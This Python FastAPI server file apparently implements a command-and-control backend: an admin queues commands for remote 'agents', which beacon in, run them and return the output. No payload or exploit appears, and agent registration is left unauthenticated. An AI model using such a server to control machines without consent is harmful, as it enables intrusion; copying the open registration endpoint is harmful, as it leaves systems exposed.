from fastapi import FastAPI, HTTPException, Depends
from database import engine, Base
from schemas import *
from crud import *
from auth import *
from config import settings

app = FastAPI()

@app.on_event("startup")
async def init_db():
    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    await seed_admin_if_needed(settings.ADMIN_USERNAME, settings.ADMIN_PASSWORD)

@app.post("/admin/login", response_model=TokenResponse)
async def login_admin(admin: AdminLogin):
    user = await authenticate_admin(admin.username, admin.password)
    if not user:
        raise HTTPException(status_code=401, detail="Invalid credentials")
    token = create_token({"sub": user.username, "role": "admin"})
    return {"access_token": token, "token_type": "bearer"}

@app.post("/agent/register")
async def register_agent_endpoint(agent: AgentRegister):
    await register_agent(agent.agent_id, agent.agent_key)
    return {"status": "agent registered"}

@app.post("/agent/login", response_model=TokenResponse)
async def login_agent(agent: AgentRegister):
    auth = await authenticate_agent(agent.agent_id, agent.agent_key)
    if not auth:
        raise HTTPException(status_code=401, detail="Invalid credentials")
    token = create_token({"sub": auth.agent_id, "role": "agent"})
    return {"access_token": token, "token_type": "bearer"}

@app.post("/task", dependencies=[Depends(get_current_admin)])
async def send_task(data: TaskCreate):
    task = await queue_task(data.agent_id, data.command)
    return {"status": "queued", "task_id": task.id}

@app.post("/agent/beacon", response_model=TaskResponse, dependencies=[Depends(get_current_agent)])
async def agent_beacon(data: BeaconRequest):
    task = await fetch_pending_task(data.agent_id)
    if task:
        return TaskResponse(task_id=task.id, command=task.command)
    return TaskResponse()

@app.post("/agent/result", dependencies=[Depends(get_current_agent)])
async def submit_result(data: ResultSubmit):
    await store_result(data.agent_id, data.task_id, data.output)
    await mark_task_complete(data.task_id)
    return {"status": "result received"}

@app.get("/tasks/{agent_id}", response_model=List[TaskView], dependencies=[Depends(get_current_admin)])
async def view_tasks(agent_id: str):
    return await get_tasks_by_agent(agent_id)

@app.get("/results/{agent_id}", response_model=List[ResultView], dependencies=[Depends(get_current_admin)])
async def view_results(agent_id: str):
    return await get_results_by_agent(agent_id)

@app.get("/tasks", response_model=List[TaskView], dependencies=[Depends(get_current_admin)])
async def view_all_tasks():
    return await get_all_tasks()

@app.get("/results", response_model=List[ResultView], dependencies=[Depends(get_current_admin)])
async def view_all_results():
    return await get_all_results()